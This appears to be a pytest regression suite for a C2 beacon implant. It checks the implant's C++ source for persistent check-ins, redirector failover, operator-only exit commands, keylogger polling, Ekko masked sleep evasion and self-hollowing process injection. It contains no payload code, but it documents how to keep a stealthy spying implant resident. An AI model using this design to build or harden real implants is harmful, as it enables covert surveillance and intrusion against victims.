"""8.2 — the beacon loop must stay RESIDENT: a regression guard.

The beacon is only worth anything if it keeps calling home. Every failure
mode that matters is a loop that STOPS or that quietly turns a temporary
problem into a permanent one:

* a check-in failure treated as fatal (the loop exits during exactly the
  outage it is supposed to survive);
* the endpoint ladder dropped, so a single filtered address or a taken-down
  redirector ends the engagement;
* the exponential backoff never reset, so a beacon that survived an outage
  keeps sleeping for a minute per check-in forever;
* undelivered results dropped instead of retried;
* the single exit path (EX/MG) replaced by "exit after one task".

The C++ is compiled by the operator, so the guard is a structural reading of
the loop's source — the same style `test_c2_resilience` uses for the backoff
— but this one parses the LOOP BODY and asserts the invariants, so a
reformatting cannot silently satisfy it.
"""
import os
import re

import pytest

_SRC = os.path.join("phantom", "payloads", "beacon", "src", "main.cpp")


@pytest.fixture(scope="module")
def source():
    with open(_SRC, encoding="utf-8", errors="replace") as handle:
        return handle.read()


def _block(text: str, start: int) -> str:
    """The brace-balanced body that starts at the first `{` at/after start."""
    open_at = text.index("{", start)
    depth = 0
    for i in range(open_at, len(text)):
        if text[i] == "{":
            depth += 1
        elif text[i] == "}":
            depth -= 1
            if depth == 0:
                return text[open_at + 1:i]
    raise AssertionError("unbalanced braces")


def _end_of_block(text: str, start: int) -> int:
    """Index just past the brace-balanced block that opens at/after start."""
    open_at = text.index("{", start)
    depth = 0
    for i in range(open_at, len(text)):
        if text[i] == "{":
            depth += 1
        elif text[i] == "}":
            depth -= 1
            if depth == 0:
                return i + 1
    raise AssertionError("unbalanced braces")


def _if_else(text: str, marker: str):
    """The (then, else) bodies of the `if (...)` containing `marker`.

    Precise on purpose: the loop has several `} else {` branches, and a
    guard that reads the wrong one is worse than no guard — it passes while
    the property it names is broken.
    """
    at = text.index(marker)
    then_body = _block(text, at)
    after = _end_of_block(text, at)
    tail = text[after:].lstrip()
    assert tail.startswith("else"), f"no else branch for: {marker}"
    return then_body, _block(text, after + text[after:].index("else"))


@pytest.fixture(scope="module")
def loop_body(source):
    """The body of `while (alive)` — the resident loop of beacon_main."""
    match = re.search(r"while\s*\(\s*alive\s*\)\s*\{", source)
    assert match, "the beacon loop `while (alive)` is gone"
    return _block(source, match.start())


class TestTheLoopIsResident:
    def test_the_flag_starts_true_and_the_loop_is_the_resident_form(self,
                                                                  source):
        assert re.search(r"bool\s+alive\s*=\s*true", source)
        assert re.search(r"while\s*\(\s*alive\s*\)", source)
        # a bounded for-loop over tasks would return after one check-in
        assert "for (int" not in source.split("while (alive)")[0][-200:]

    def test_the_loop_survives_a_failed_checkin(self, loop_body):
        """The failure branch must not end the run.

        This is the whole point of a resident beacon: the loop exits during
        exactly the outage it exists to survive.
        """
        assert "if (!response.empty())" in loop_body
        _then, fail = _if_else(loop_body, "if (!response.empty())")
        assert "alive = false" not in fail, \
            "a failed check-in must back off, never stop the beacon"
        assert "consecutive_failures++" in fail

    def test_the_only_exits_are_the_operator_commands(self, loop_body):
        """Exactly two exits, both the EX/MG protocol answers."""
        exits = [m.start() for m in
                 re.finditer(r"alive\s*=\s*false\s*;", loop_body)]
        assert len(exits) == 2, (
            f"the loop has {len(exits)} exit(s): only EX (exit) and MG "
            "(migrate) may stop a beacon")
        for at in exits:
            window = loop_body[max(0, at - 400):at]
            assert "'X'" in window or "'G'" in window, \
                "an exit that is not the EX/MG protocol answer"

    def test_the_protocol_answers_are_still_recognised(self, source):
        assert r"\x01\x02EX" in source
        assert r"\x01\x02MG" in source


class TestTheLoopKeepsWorking:
    def test_the_endpoint_ladder_is_consulted_on_failure(self, loop_body):
        assert "cfg.on_failure()" in loop_body
        assert "cfg.endpoint()" in loop_body

    def test_recovery_resets_the_backoff_to_the_operator_base(self, loop_body):
        assert "cfg.on_success()" in loop_body
        assert "cfg.sleep_ms = cfg.base_sleep_ms" in loop_body

    def test_the_backoff_is_capped_and_doubles(self, loop_body):
        assert "std::min(60000, cfg.sleep_ms * 2)" in loop_body

    def test_undelivered_results_are_retried_before_new_work(self, loop_body):
        retry = loop_body.index("for (auto it = pending_results.begin()")
        parse = loop_body.index("json_mini::parse_tasks(response)")
        assert retry < parse, \
            "results must be retried BEFORE new tasks are parsed"
        assert "pending_results.emplace_back" in loop_body

    def test_the_sleep_is_masked_and_jittered(self, loop_body):
        assert "cfg.get_sleep_ms()" in loop_body
        assert "ekko::ekko_sleep_masked(jitter_sleep)" in loop_body
        # the masked sleep must remain optional (DISABLE_ANTI builds)
        assert "#ifndef DISABLE_ANTI" in loop_body

    def test_the_loop_keeps_servicing_local_sources(self, loop_body):
        # the keylogger thread is polled every iteration: a loop that only
        # checks in would still miss keystrokes between check-ins
        assert "keylogger::poll()" in loop_body

    def test_a_task_hang_cannot_wedge_the_loop(self, loop_body):
        assert "run_task_with_timeout" in loop_body
        assert "budget_ms" in loop_body


class TestEntryPoint:
    def test_the_process_entry_calls_the_resident_loop(self, source):
        """WinMain/main must reach `beacon_main`, not return early."""
        win = source.split("int WINAPI WinMain", 1)
        assert len(win) == 2
        body = win[1]
        assert "beacon_main(" in body.split("#else", 1)[0]
        # self_hollow() may only skip the work when it FAILED to hollow
        assert "if (injection::self_hollow())" in body
        assert re.search(r"if\s*\(injection::self_hollow\(\)\)\s*\n\s*return 0;",
                         body)

    def test_the_unix_entry_is_the_same_loop(self, source):
        tail = source.rsplit("int main(int argc, char** argv)", 1)
        assert len(tail) == 2
        assert "beacon_main(argc, argv)" in tail[1]
